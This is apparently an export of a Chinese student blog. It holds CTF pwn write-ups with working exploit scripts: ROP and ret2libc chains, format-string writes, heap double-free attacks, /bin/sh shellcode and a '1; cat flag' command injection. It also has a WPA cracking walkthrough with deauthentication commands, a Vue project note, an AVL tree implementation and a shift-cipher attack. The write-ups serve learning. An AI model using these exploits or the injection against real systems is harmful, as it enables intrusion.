{"pages":[],"posts":[{"title":"ACTF2019 Pwn","text":"难题都没有做出来。 babystack只能溢出0x10字节，因此使用栈迁移。这题的迁移比较简单，题目给了栈地址，并且只需要迁移一次。 123456789101112131415161718leave = 0x400a18pop_rdi = 0x400ad3sla('?\\n',str(0xe0))ru('saved at 0x')addr = int(ru('\\n'),16)# ebp2,payload,padding,fake ebp,leave_retpayload = flat('a'*8,pop_rdi,elf.got['puts'],elf.plt['puts'],0x4008f6).ljust(0xd0,'a') + flat(addr,leave)sa('?\\n',payload)ru('~\\n')puts = uu64(r(6))system,binsh = ret2libc(puts,'puts')sla('?\\n',str(0xe0))ru('saved at 0x')addr = int(ru('\\n'),16)payload = flat('a'*8,pop_rdi,binsh,system).ljust(0xd0,'a') + flat(addr,leave)sa('?\\n',payload) 一个复读机很容易发现格式化字符串漏洞，首先测出偏移为7处是返回地址，我们往这里写地址即可。写什么地址呢？程序没有开启NX保护，因此可以先布置shellcode，然后写shellcode地址。 但是我们只能在栈上布置shellcode，而栈地址以0xff开头，如果直接写入4字节地址，那么需要输出非常长的字符串才行，非常耗时。因此我们尝试分2次写入，每次2字节。 从这里盗取了一张不错的图示： 123456789101112131415161718192021222324252627282930313233343536373839404142To illustrate why we write payload in that wayThis is an example stack layout, supposing the leak address is 0xffffc970 *---------------*c930 | 0xffffc970 | (addr of format string) *---------------*c934 | xxxxxxxxxx | 1$ (first parameter of printf) *---------------* ..... *---------------*c94c | return addr | 7$ *---------------* ..... *---------------*c970 | 0xffffc94c | 16$ (start addr of read buffer) *---------------*c974 | &quot;%516&quot; | 17$ (51628 = 0xc9b0 - 4) *---------------*c978 | &quot;28d%&quot; | 18$ *---------------*c97c | &quot;16$h&quot; | 19$ *---------------*c980 | &quot;naaa&quot; | 20$ *---------------*c984 | 0xffffc94e | 21$ *---------------*c988 | &quot;%138&quot; | 22$ (13869 = 0xffff - 0xc9b0 - 4 - 3) *---------------*c98c | &quot;69d%&quot; | 23$ *---------------*c990 | &quot;21$h&quot; | 24$ *---------------*c994 | &quot;naaa&quot; | 25$ *---------------*c998 | &quot;aaaa&quot; | 26$ *---------------* ..... *---------------*c9b0 | | | shellcode | | | *---------------* 首先要写的目标是0xffffc94c也就是返回地址所在位置，向这个位置先写入0xc9b0也就是后面我们计算出的shellcode地址的低4位，这里-4是因为前面已经输出0xffffc94c这4字节了。因此第一步payload为%51628d%16$hnaaa，最后aaa是为了凑到4字节对齐，hn是以2字节写入，16的偏移可以自动化测出。 同理，第二步要写入的目标是0xffffc94e，写入数据是shellcode高4位减去低4位0xffff-0xc9b0，随后-4是因为前面已经输出0xffffc94e这4字节，-3是因为第一步填充的aaa占3字节。第二步payload即%13869d%21$hnaaa。 两步的payload合并后长为0x28字节，在后面放上shellcode，此时即确定了shellcode的地址。触发漏洞就能getshell了。 12345678910111213shellcode = '\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80'sla('Exit\\n','1')buf = int(r(8),16)sc = buf+0x28ret = buf-0x24payload = p32(ret)+'%'+str((sc&amp;0xffff)-4)+'d%16$hnaaa'payload += p32(ret+2)+'%'+str(((sc&gt;&gt;16)&amp;0xffff)-(sc&amp;0xffff)-7)+'d%21$hnaaa'payload += shellcodes(payload)sla('Exit\\n','2') another_repeater题目在输入长度时可以整数溢出，还给了buf的地址。那么直接输入-1，然后ret2shellcode即可。 1234567shellcode = '\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80'sla('peat?\\n','-1')addr = int(r(8),16)payload = shellcode.ljust(0x41b+4,'a')+p32(addr)sa('\\n',payload) babyheapuaf覆盖打印函数为system，内容为/bin/sh。 123456789101112131415161718192021def add(size,content='a'): sla(': ','1') sla('size: \\n',str(size)) sa('content: \\n',content)def free(index): sla(': ','2') sla('index: \\n',str(index))def show(index): sla(': ','3') sla('index: \\n',str(index))add(0x20) # 0add(0x20) # 1free(0)free(1)binsh = 0x602010add(0x10,flat(binsh,elf.plt['system'])) # 2show(0) message利用double free欺骗malloc分配一个位于bss段的chunk，使得我们可以控制全局数组，从而修改0号堆块的内容。然后先泄露libc再劫持__free_hook到system即可。需要注意fastbin的大小检查。 12345678910111213141516171819202122232425262728293031323334353637383940414243def add(size,content='a'): sla(': ','1') sla(':\\n',str(size)) sa(':\\n',content)def free(index): sla(': ','2') sla(':\\n',str(index))def edit(index,content): sla(': ','3') sla(':\\n',str(index)) sa(':\\n',content)def show(index): sla(': ','4') sla(':\\n',str(index))add(0x50) # 0add(0x40) # 1add(0x40) # 2free(1)free(2)free(1)fake = 0x602060-0x8add(0x40,p64(fake)) # 3 &lt;-&gt; 1add(0x40) # 4 &lt;-&gt; 2add(0x40) # 5 &lt;-&gt; 1add(0x40,p64(elf.got['puts'])) # 6 &lt;-&gt; fakeshow(0)ru(': ')puts = uu64(r(6))libc = LibcSearcher('puts', puts)base = puts - libc.dump('puts')system = base + libc.dump('system')free_hook = base + libc.dump('__free_hook')edit(6,p64(free_hook))edit(0,p64(system))add(0x8,'/bin/sh\\x00') # 7free(7)","link":"/post/ACTF2019Pwn/"},{"title":"“老有所得”项目实践心得","text":"其实最大的心得是不要一次开多个项目。 在这次的“老有所得”项目中，我主要负责项目中前后端通讯部分的开发。我们团队遵循前后端分离的开发原则，因此在前端开发时我无需了解太多后端的实现细节，只需要掌握后端提供的API的功能与特性。这一开发原则无疑大大提高了整个项目开发过程的并行度，也简化了我的工作。 项目后端部署在CentOS服务器上，前端通过访问服务器特定端口的特定url来向服务器发起请求。例如登录请求： 众所周知，网络请求发生错误是十分常见的，后端出现异常也同样是家常便饭，因此，为了在数据获取出错时及时定位问题，我利用Postman来模拟对服务器发送请求的操作以检查返回的数据，并利用Navicat检查数据库内的数据是否及时更新，以及对数据库进行修改。利用好这两个软件极大地提高了调试错误的效率。 向后端发送的请求通常是HTTP/POST方法的异步请求，这就要用到AJAX技术（实际上获取数据通常采用JSON格式而不是XML）。异步请求提高了应用的性能，但是却会带来被戏称为“回调地狱”(callback hell)的问题——由于异步请求的原理，返回的数据都是由回调函数来处理，在代码中回调函数常常会嵌套很多层，使得代码非常难维护和理解。本项目中我主要通过将函数模块化的办法解决这一问题。 另一个巨大的、而又极易被忽视的问题是：回调函数与js中的主函数的执行是类似并行的，这使得在回调函数中修改变量的值可能会滞后，或者说迟于我们期望的时间。这一问题十分危险而隐蔽，因此我通常都在回调函数内部完成需要用到被修改变量的操作。 最后值得一提的就是Vue.js中的数据绑定问题，这类问题也是耗费我时间最久的一类。首先，在Vue.js中通过索引给数组元素赋值是无法触发视图更新的。因此我主要使用如下两种方式更新数组： 12this.listData.push(ret.data[item]); // 1this.$set(this.replyTime, item, this.$calcTime(ret.data[item].creatime.time)); // 2 对于二维数组的更新，采用这种较为麻烦的变体： 12345const temp_list = this.listData[val].slice(0);for (let item in ret.data) { temp_list.push(ret.data[item]);}this.$set(this.listData, val, temp_list); 其次，诸如Mustache内部和v-bind系列的数据绑定中，不能直接使用函数的返回值，这一问题困扰了我非常之久，最后通过使用数组元素绑定，并通过函数获取数组内数据的方式绕过了这一限制。 最后，v-if与v-for在同一节点中出现时，v-for优先级更高，可以把v-if放在父节点上来避免这种情况；嵌套v-for时，节点的:key属性必须两两不同。 本项目中，我学习了新的前端框架uni-app和Vue.js，尽管各有一定不足，我依然认为两者为项目开发提供了不少便利；而在界面布局与设计上，我并没有太多贡献，不过在进行调整时使用到了flex布局，算是比较大的收获。 2019.3.28更新项目进国创了。。。其实有点意外。","link":"/post/ADMinder/"},{"title":"Aircrack 套件破解 WPA&#x2F;WPA2 密码","text":"《无线网络安全》作业。梦回大一。 手机开启热点，设置弱密码 merc123321，热点 SSID 为 nova 4。物理机连接 nova 4 无线网络作为被害主机。 为 Kali 虚拟机添加无线网卡，随后即可在 ifconfig 的输出中看到 wlan0 网卡： 首先启动监听： 1sudo airmon-ng start wlan0 结果如图： 此时 ifconfig 可以看到 wlan0mon 监听网卡： 随后扫描无线网络： 1sudo airodump-ng wlan0mon 结果如图，可以看到 nova 4 网络的 BSSID 为 D8:9B:3B:9E:AB:A9。 利用该 BSSID 过滤掉其余网络流量： 1sudo airodump-ng -c 11 --bssid D8:9B:3B:9E:AB:A9 -w psk wlan0mon 结果如图： 此时我们需要捕获到 WPA 握手包，因此可以攻击一个已经连接到该网络的主机（即我们的物理机），让它强制掉线并重连产生握手包。 首先查看被害主机 MAC 地址： 可以看到 MAC 地址为 F4:8C:50:9F:E5:43。实际上，在前面 airodump-ng 时的界面中也可以直接看到连接了该网络的主机 MAC 地址。随后发送 DeAuth 包使其掉线： 1sudo aireplay-ng -0 1 -a D8:9B:3B:9E:AB:A9 -c F4:8C:50:9F:E5:43 wlan0mon 出现 WPA handshake 即捕获到了握手包，可以停止捕获了。 此时在目录下会生成 psk-01.cap ，我们使用 aircrack-ng 进行口令破解： 1sudo aircrack-ng -w password.lst -b D8:9B:3B:9E:AB:A9 psk*.cap 使用的字典中包含了 merc123321 这个真正的密码： 最后即可成功破解：","link":"/post/AircrackWPA/"},{"title":"AVL 树","text":"数据结构上机课花了点时间实现的AVL树。基本上在抄书。 包含了二叉树、二叉查找树和AVL树的实现，不过毕竟没有真正学过C++，对OOP也还不算很熟悉。。碰到了一些问题： 继承的类也不能访问父类的private成员，不过可以用using 父类::成员名的方式访问父类的protected成员 子类中重载了父类的某个成员函数后，对子类和父类中的该函数同时加virtual关键字修饰，可以在运行时判断具体需要调用的函数是哪一个版本 还没有深入研究过虚函数……总之OOP有点复杂，但好像有点优美？ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608#include &lt;iostream&gt;#include &lt;stack&gt;using namespace std;enum Balance_factor {left_higher, equal_height, right_higher};enum Error_code {success, not_present, duplicate_error};template &lt;class Record&gt;struct Binary_node{ Record data; Binary_node&lt;Record&gt; *left, *right; Binary_node() {left = right = NULL;}; Binary_node(const Record &amp;x) {data = x; left = right = NULL;}; virtual void set_balance(Balance_factor b) {}; virtual Balance_factor get_balance() const {return equal_height;};};template &lt;class Record&gt;class Binary_tree{public: Binary_tree() {root = NULL; count = 0;}; bool empty() const {return !root;}; int size() const {return count;}; int height() const { if (!count) return 0; int tmp, i; for (tmp = 1, i = 0; tmp &lt;= count; ++i) tmp &lt;&lt;= 1; return i; } void preorder(void (*visit)(Record &amp;)) {recursive_preorder(root, visit);}; void inorder(void (*visit)(Record &amp;)) {recursive_inorder(root, visit);}; void postorder(void (*visit)(Record &amp;)) {recursive_postorder(root, visit);}; void insert(Record &amp;);protected: Binary_node&lt;Record&gt; *root; int count; void recursive_preorder(Binary_node&lt;Record&gt; *sub_root, void (*visit)(Record &amp;)) { if (sub_root) { (*visit)(sub_root-&gt;data); recursive_preorder(sub_root-&gt;left, visit); recursive_preorder(sub_root-&gt;right, visit); } } void recursive_inorder(Binary_node&lt;Record&gt; *sub_root, void (*visit)(Record &amp;)) { if (sub_root) { recursive_inorder(sub_root-&gt;left, visit); (*visit)(sub_root-&gt;data); recursive_inorder(sub_root-&gt;right, visit); } } void recursive_postorder(Binary_node&lt;Record&gt; *sub_root, void (*visit)(Record &amp;)) { if (sub_root) { recursive_postorder(sub_root-&gt;left, visit); recursive_postorder(sub_root-&gt;right, visit); (*visit)(sub_root-&gt;data); } }};template &lt;class Record&gt;void Binary_tree&lt;Record&gt;::insert(Record &amp;x){ if(empty()) { root = new Binary_node&lt;Record&gt;(x); ++count; return; } stack&lt;int&gt; numbers; int item = 0, tmpcount = size(); while (tmpcount &gt; 0) { numbers.push((tmpcount&amp;1) ? 1:2); tmpcount = (tmpcount-1)&gt;&gt;1; } Binary_node&lt;Record&gt; *current = root; while (numbers.size() &gt; 1) { item = numbers.top(); if (item == 1) current = current-&gt;left; if (item == 2) current = current-&gt;right; numbers.pop(); } item = numbers.top(); if (item == 1) current-&gt;left = new Binary_node&lt;Record&gt;(x); if (item == 2) current-&gt;right = new Binary_node&lt;Record&gt;(x); ++count;}template &lt;class Record&gt;class Search_tree: public Binary_tree&lt;Record&gt;{public: Error_code insert(const Record &amp;new_data) { Error_code result = search_and_insert(root, new_data); if (result == success) ++count; return result; } Error_code remove(const Record &amp;target) { Error_code result = search_and_destroy(root, target); if (result == success) --count; return result; } Error_code tree_search(Record &amp;target) const { Error_code result = success; Binary_node&lt;Record&gt; *found = search_for_node(root, target); if (!found) result = not_present; else target = found-&gt;data; return result; }protected: using Binary_tree&lt;Record&gt;::root; using Binary_tree&lt;Record&gt;::count; Binary_node&lt;Record&gt; *search_for_node(Binary_node&lt;Record&gt;* sub_root, const Record &amp;target) const; Error_code search_and_insert(Binary_node&lt;Record&gt; * &amp;sub_root, const Record &amp;new_data); Error_code search_and_destroy(Binary_node&lt;Record&gt;* &amp;sub_root, const Record &amp;target); Error_code remove_root(Binary_node&lt;Record&gt; * &amp;sub_root);};template &lt;class Record&gt;Binary_node&lt;Record&gt; *Search_tree&lt;Record&gt;::search_for_node(Binary_node&lt;Record&gt;* sub_root, const Record &amp;target) const{ if (!sub_root || sub_root-&gt;data == target) return sub_root; else if (sub_root-&gt;data &lt; target) return search_for_node(sub_root-&gt;right, target); else return search_for_node(sub_root-&gt;left, target);}template &lt;class Record&gt;Error_code Search_tree&lt;Record&gt;::search_and_insert(Binary_node&lt;Record&gt; * &amp;sub_root, const Record &amp;new_data){ if (!sub_root) { sub_root = new Binary_node&lt;Record&gt;(new_data); return success; } else if (new_data &lt; sub_root-&gt;data) return search_and_insert(sub_root-&gt;left, new_data); else if (new_data &gt; sub_root-&gt;data) return search_and_insert(sub_root-&gt;right, new_data); else return duplicate_error;}template &lt;class Record&gt;Error_code Search_tree&lt;Record&gt;::remove_root(Binary_node&lt;Record&gt; * &amp;sub_root){ if (!sub_root) return not_present; Binary_node&lt;Record&gt; *to_delete = sub_root; if (!sub_root-&gt;right) sub_root = sub_root-&gt;left; else if (!sub_root-&gt;left) sub_root = sub_root-&gt;right; else { to_delete = sub_root-&gt;left; Binary_node&lt;Record&gt; *parent = sub_root; while (to_delete-&gt;right) { parent = to_delete; to_delete = to_delete-&gt;right; } sub_root-&gt;data = to_delete-&gt;data; if (parent == sub_root) sub_root-&gt;left = to_delete-&gt;left; else parent-&gt;right = to_delete-&gt;left; } delete to_delete; return success;}template &lt;class Record&gt;Error_code Search_tree&lt;Record&gt;::search_and_destroy(Binary_node&lt;Record&gt;* &amp;sub_root, const Record &amp;target){ if (!sub_root || sub_root-&gt;data == target) return remove_root(sub_root); else if (target &lt; sub_root-&gt;data) return search_and_destroy(sub_root-&gt;left, target); else return search_and_destroy(sub_root-&gt;right, target);}template &lt;class Record&gt;struct AVL_node: public Binary_node&lt;Record&gt;{ using Binary_node&lt;Record&gt;::left; using Binary_node&lt;Record&gt;::right; using Binary_node&lt;Record&gt;::data; Balance_factor balance; AVL_node() {left = right = NULL; balance = equal_height;}; AVL_node(const Record &amp;x) { data = x; left = right = NULL; balance = equal_height; }; void set_balance(Balance_factor b) {balance = b;}; Balance_factor get_balance() const {return balance;};};template &lt;class Record&gt;class AVL_tree: public Search_tree&lt;Record&gt;{public: Error_code insert(const Record &amp;new_data) { bool taller; return avl_insert(root, new_data, taller); } Error_code remove(Record &amp;new_data) { bool shorter = true; return avl_remove(root, new_data, shorter); };private: using Binary_tree&lt;Record&gt;::root; Error_code avl_insert(Binary_node&lt;Record&gt; * &amp;sub_root, const Record &amp;new_data, bool &amp;taller); void rotate_left(Binary_node&lt;Record&gt; * &amp;sub_root); void rotate_right(Binary_node&lt;Record&gt; * &amp;sub_root); void right_balance(Binary_node&lt;Record&gt; * &amp;sub_root); void left_balance(Binary_node&lt;Record&gt; * &amp;sub_root); Error_code avl_remove(Binary_node&lt;Record&gt; * &amp;sub_root, Record &amp;new_data, bool &amp;shorter); bool right_balance2(Binary_node&lt;Record&gt; * &amp;sub_root); bool left_balance2(Binary_node&lt;Record&gt; * &amp;sub_root);};template &lt;class Record&gt;Error_code AVL_tree&lt;Record&gt;::avl_insert(Binary_node&lt;Record&gt; * &amp;sub_root,const Record &amp;new_data, bool &amp;taller){ Error_code result = success; if (!sub_root) { sub_root = new AVL_node&lt;Record&gt;(new_data); taller = true; } else if (new_data == sub_root-&gt;data) { result = duplicate_error; taller = false; } else if (new_data &lt; sub_root-&gt;data) { result = avl_insert(sub_root-&gt;left, new_data, taller); if (taller) switch (sub_root-&gt;get_balance()) { case left_higher: left_balance(sub_root); taller = false; break; case equal_height: sub_root-&gt;set_balance(left_higher); break; case right_higher: sub_root-&gt;set_balance(equal_height); taller = false; break; } } else { result = avl_insert(sub_root-&gt;right, new_data, taller); if (taller) switch (sub_root-&gt;get_balance()) { case left_higher: sub_root-&gt;set_balance(equal_height); taller = false; break; case equal_height: sub_root-&gt;set_balance(right_higher); break; case right_higher: right_balance(sub_root); taller = false; break; } } return result;}template &lt;class Record&gt;void AVL_tree&lt;Record&gt;::rotate_left(Binary_node&lt;Record&gt; * &amp;sub_root){ if (!sub_root || !sub_root-&gt;right) cout &lt;&lt; &quot;WARNING: program error detected in rotate left&quot; &lt;&lt; endl; else { Binary_node&lt;Record&gt; *right_tree = sub_root-&gt;right; sub_root-&gt;right = right_tree-&gt;left; right_tree-&gt;left = sub_root; sub_root = right_tree; }}template &lt;class Record&gt;void AVL_tree&lt;Record&gt; :: rotate_right(Binary_node&lt;Record&gt; * &amp;sub_root){ if (!sub_root || !sub_root-&gt;left) cout &lt;&lt; &quot;WARNING: program error detected in rotate right&quot; &lt;&lt; endl; else { Binary_node&lt;Record&gt; *left_tree = sub_root-&gt;left; sub_root-&gt;left = left_tree-&gt;right; left_tree-&gt;right = sub_root; sub_root = left_tree; }}template &lt;class Record&gt;void AVL_tree&lt;Record&gt;::right_balance(Binary_node&lt;Record&gt; * &amp;sub_root){ Binary_node&lt;Record&gt; * &amp;right_tree = sub_root-&gt;right; switch (right_tree-&gt;get_balance()) { case right_higher: sub_root-&gt;set_balance(equal_height); right_tree-&gt;set_balance(equal_height); rotate_left(sub_root); break; case equal_height: cout &lt;&lt; &quot;WARNING: program error in right balance&quot; &lt;&lt; endl; case left_higher: Binary_node&lt;Record&gt; *sub_tree = right_tree-&gt;left; switch (sub_tree-&gt;get_balance()) { case equal_height: sub_root-&gt;set_balance(equal_height); right_tree-&gt;set_balance(equal_height); break; case left_higher: sub_root-&gt;set_balance(equal_height); right_tree-&gt;set_balance(right_higher); break; case right_higher: sub_root-&gt;set_balance(left_higher); right_tree-&gt;set_balance(equal_height); break; } sub_tree-&gt;set_balance(equal_height); rotate_right(right_tree); rotate_left(sub_root); break; }}template &lt;class Record&gt;void AVL_tree&lt;Record&gt;::left_balance(Binary_node&lt;Record&gt; * &amp;sub_root){ Binary_node&lt;Record&gt; * &amp;left_tree = sub_root-&gt;left; switch (left_tree-&gt;get_balance()) { case left_higher: sub_root-&gt;set_balance(equal_height); left_tree-&gt;set_balance(equal_height); rotate_right(sub_root); break; case equal_height: cout &lt;&lt; &quot;WARNING: program error in right balance&quot; &lt;&lt; endl; case right_higher: Binary_node&lt;Record&gt; *sub_tree = left_tree-&gt;right; switch (sub_tree-&gt;get_balance()) { case equal_height: sub_root-&gt;set_balance(equal_height); left_tree-&gt;set_balance(equal_height); break; case right_higher: sub_root-&gt;set_balance(equal_height); left_tree-&gt;set_balance(left_higher); break; case left_higher: sub_root-&gt;set_balance(right_higher); left_tree-&gt;set_balance(equal_height); break; } sub_tree-&gt;set_balance(equal_height); rotate_left(left_tree); rotate_right(sub_root); break; }}template &lt;class Record&gt;Error_code AVL_tree&lt;Record&gt;::avl_remove(Binary_node&lt;Record&gt; * &amp;sub_root,Record &amp;new_data, bool &amp;shorter){ Error_code result = success; Record sub_record; if (!sub_root) { shorter = false; return not_present; } else if (new_data == sub_root-&gt;data) { Binary_node&lt;Record&gt; *to_delete = sub_root; if (!sub_root-&gt;right) { sub_root = sub_root-&gt;left; shorter = true; delete to_delete; return success; } else if (!sub_root-&gt;left) { sub_root = sub_root-&gt;right; shorter = true; delete to_delete; return success; } else { to_delete = sub_root-&gt;left; Binary_node&lt;Record&gt; *parent = sub_root; while (to_delete-&gt;right) { parent = to_delete; to_delete = to_delete-&gt;right; } new_data = to_delete-&gt;data; sub_record = new_data; } } if (new_data &lt; sub_root-&gt;data) { result = avl_remove(sub_root-&gt;left, new_data, shorter); if (sub_record.the_key()) sub_root-&gt;data = sub_record; if (shorter) switch (sub_root-&gt;get_balance()) { case left_higher: sub_root-&gt;set_balance(equal_height); break; case equal_height: sub_root-&gt;set_balance(right_higher); shorter = false; break; case right_higher: shorter = right_balance2(sub_root); break; } } if (new_data &gt; sub_root-&gt;data) { result = avl_remove(sub_root-&gt;right, new_data, shorter); if (sub_record.the_key()) sub_root-&gt;data = sub_record; if (shorter) switch (sub_root-&gt;get_balance()) { case left_higher: shorter = left_balance2(sub_root); break; case equal_height: sub_root-&gt;set_balance(left_higher); shorter = false; break; case right_higher: sub_root-&gt;set_balance(equal_height); break; } } return result;}template &lt;class Record&gt;bool AVL_tree&lt;Record&gt;::right_balance2(Binary_node&lt;Record&gt; * &amp;sub_root){ bool shorter; Binary_node&lt;Record&gt; * &amp;right_tree = sub_root-&gt;right; switch (right_tree-&gt;get_balance()) { case right_higher: sub_root-&gt;set_balance(equal_height); right_tree-&gt;set_balance(equal_height); rotate_left(sub_root); shorter = true; break; case equal_height: right_tree-&gt;set_balance(left_higher); rotate_left(sub_root); shorter = false; break; case left_higher: Binary_node&lt;Record&gt; *sub_tree = right_tree-&gt;left; switch (sub_tree-&gt;get_balance()) { case equal_height: sub_root-&gt;set_balance(equal_height); right_tree-&gt;set_balance(equal_height); break; case left_higher: sub_root-&gt;set_balance(equal_height); right_tree-&gt;set_balance(right_higher); break; case right_higher: sub_root-&gt;set_balance(left_higher); right_tree-&gt;set_balance(equal_height); break; } sub_tree-&gt;set_balance(equal_height); rotate_right(right_tree); rotate_left(sub_root); shorter = true; break; } return shorter;}template &lt;class Record&gt;bool AVL_tree&lt;Record&gt;::left_balance2(Binary_node&lt;Record&gt; * &amp;sub_root){ bool shorter; Binary_node&lt;Record&gt; * &amp;left_tree = sub_root-&gt;left; switch (left_tree-&gt;get_balance()) { case left_higher: sub_root-&gt;set_balance(equal_height); left_tree-&gt;set_balance(equal_height); rotate_right(sub_root); shorter = true; break; case equal_height: left_tree-&gt;set_balance(right_higher); rotate_right(sub_root); shorter = false; break; case right_higher: Binary_node&lt;Record&gt; *sub_tree = left_tree-&gt;right; switch (sub_tree-&gt;get_balance()) { case equal_height: sub_root-&gt;set_balance(equal_height); left_tree-&gt;set_balance(equal_height); break; case right_higher: sub_root-&gt;set_balance(equal_height); left_tree-&gt;set_balance(left_higher); break; case left_higher: sub_root-&gt;set_balance(right_higher); left_tree-&gt;set_balance(equal_height); break; } sub_tree-&gt;set_balance(equal_height); rotate_left(left_tree); rotate_right(sub_root); shorter = true; break; } return shorter;}template &lt;class Record&gt;void print(Record &amp;x){ cout &lt;&lt; x &lt;&lt; &quot; &quot;;}typedef char Record;int main(){ AVL_tree&lt;Record&gt; mytree; mytree.insert('A'); mytree.insert('V'); mytree.insert('L'); mytree.insert('T'); mytree.insert('R'); mytree.insert('E'); mytree.insert('I'); mytree.insert('S'); mytree.insert('O'); mytree.insert('K'); cout &lt;&lt; &quot;Preorder:&quot; &lt;&lt; endl; mytree.preorder(print); cout &lt;&lt; endl &lt;&lt; endl; cout &lt;&lt; &quot;Inorder:&quot; &lt;&lt; endl; mytree.inorder(print); cout &lt;&lt; endl &lt;&lt; endl; cout &lt;&lt; &quot;Postorder:&quot; &lt;&lt; endl; mytree.postorder(print); cout &lt;&lt; endl &lt;&lt; endl; cin.get(); return 0;}","link":"/post/AVLTree/"},{"title":"对移位密码的自动化攻击","text":"《密码学基础》小作业。 背景对常见的移位密码的攻击，一般是穷举密钥和可能的明文，然后判断其中哪个明文有意义。然而，对于“有意义”的判断是基于人的主观意志，对计算机而言很难自动化。因此引入破解替换密码时常用的词频分析法，来实现对移位密码的自动化攻击。 攻击简介用$p_i$表示第$i$个字母在正常英文文本中出现的概率，$0&lt;=i&lt;=25$。根据统计数据，有： $$\\sum_{i=0}^{25}p_i^2\\approx 0.065$$ 用$q_i$表示第$i$个字母在密文文本中出现的概率（准确地说，频率），$0&lt;=i&lt;=25$。如果密钥为$k$，则对于每个$i$而言，$q_{i+k}$应约等于$p_i$。 如果对于每个$j\\in\\lbrace 0,…,25\\rbrace$，我们计算$I_j$的值： $$I_j=\\sum_{i=0}^{25}p_i\\cdot q_{i+j}$$ 那么对于实际使用的密钥$k$，应有$I_k\\approx 0.065$。 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546import mathkey_space = 26c = 'OVDTHUFWVZZPISLRLFZHYLAOLYL'lenc = len(c)std = 0.065dev = 99k = 0# from wikipediap = [0.08167,0.01492,0.02782,0.04253,0.12702, 0.02228,0.02015,0.06094,0.06966,0.00153, 0.00772,0.04025,0.02406,0.06749,0.07507, 0.01929,0.00095,0.05987,0.06327,0.09056, 0.02758,0.00978,0.02360,0.00150,0.01974, 0.00074]q = []def num2ord(num): return ord('A') + numdef ord2num(i): return i - ord('A')for i in range(key_space): q.append(c.count(chr(num2ord(i)) ) * 1.0 / lenc)for j in range(key_space): Ij = 0 for i in range(key_space): Ij += p[i] * q[(i+j) % key_space] cur_dev = math.fabs(Ij - std) # deviation if (cur_dev &lt; dev): dev = cur_dev k = jprint('Key: %d' % k)m = ''for i in range(lenc): m += chr(num2ord(ord2num(ord(c[i])-k) % key_space))print('Plaintext: %s' % m)# Key: 7# Plaintext: HOWMANYPOSSIBLEKEYSARETHERE","link":"/post/AutomatedAttackonShiftCipher/"},{"title":"BJDCTF2019 Pwn 题解","text":"新人向比赛，作为巩固基础的练习。 babyrouter读入ip地址并没有过滤就作为system的参数。因此直接构造1; cat flag即可。 babystackret2text模板题。 123sla('name:\\n','1000')payload = flat('a'*0x18,elf.sym['backdoor'])sla('name?\\n', payload) babyropret2libc模板题。 123456789pop_rdi = 0x400733payload = flat('a'*0x28,pop_rdi,elf.got['read'],elf.plt['puts'],elf.sym['vuln'])ru('story!\\n')sl(payload)read = uu64(r(6))leak('read',read)system,binsh = ret2libc(read, 'read')payload = flat('a'*0x28,pop_rdi,binsh,system,'a'*8)sla('story!\\n',payload) babystack2本题在babystack的基础上，限制了输入的长度： 12345if ( (signed int)nbytes &gt; 10 ) { puts(&quot;Oops,u name is too long!&quot;); exit(-1); } 注意到这里仅仅判断了大于，而且会强制类型转换为有符号数，而原来的nbytes是无符号的，因此可以整数溢出绕过。 123sla('name:\\n','-1')payload = flat('a'*0x18,elf.sym['backdoor'])sla('name?\\n', payload) babyrop2本题在babyrop的基础上增加了canary，那么泄露canary即可。要做到这一点，无疑需要新增函数gift的帮助。在该函数中明显存在一个格式化字符串漏洞。 通过反复%2$p，%3$p可知canary在第7个，这可以通过其长度8字节以及末尾的00字节判断。然后从汇编中可知canary位于ebp-0x10处，填入适当位置即可。 12345678910111213sla('u!\\n','%7$p')ru('0x')canary = int(r(16),16)leak('canary', canary)pop_rdi = 0x400993payload = flat('a'*0x18,canary,'a'*8,pop_rdi,elf.got['read'],elf.plt['puts'],elf.sym['vuln'])ru('story!\\n')sl(payload)read = uu64(r(6))leak('read',read)system,binsh = ret2libc(read, 'read')payload = flat('a'*0x18,canary,'a'*8,pop_rdi,binsh,system,'a'*8)sla('story!\\n',payload) encrypted_stack逆向题，sub_400a70处存在求逆元函数，说明题目可能使用了RSA加密，我们的任务就是找到私钥然后对题目产生的随机数进行解密，循环20次后即可通过验证，最后ret2libc。在main中可以发现如下语句： 12v7 = qword_602098;v8 = qword_602090; 猜测是RSA的e和N，查看后发现e=0x10001, N=0x150013E8C603B57。这个N显然容易分解，从而得到私钥。 123456789101112131415161718192021222324252627282930313233343536N = 94576960329497431d = 26375682325297625def powmod(a, b, m): if a == 0: return 0 if b == 0: return 1 res = powmod(a,b//2,m) res *= res res %= m if b&amp;1: res *= a res %= m return resdef ans(): global ru,sl ru(&quot;it\\n&quot;) for i in range(20): c = int(ru('\\n')) m = powmod(c, d, N) sl(str(m)) ru('\\n')ans()ru('name:\\n')pop_rdi = 0x40095awelcome = 0x400b30payload = flat('a'*0x48,pop_rdi,elf.got['read'],elf.plt['puts'],welcome)sl(payload)read = uu64(r(6))leak('read',read)system,binsh = ret2libc(read,'read')payload = flat('a'*0x48,pop_rdi,binsh,system)sl(payload) 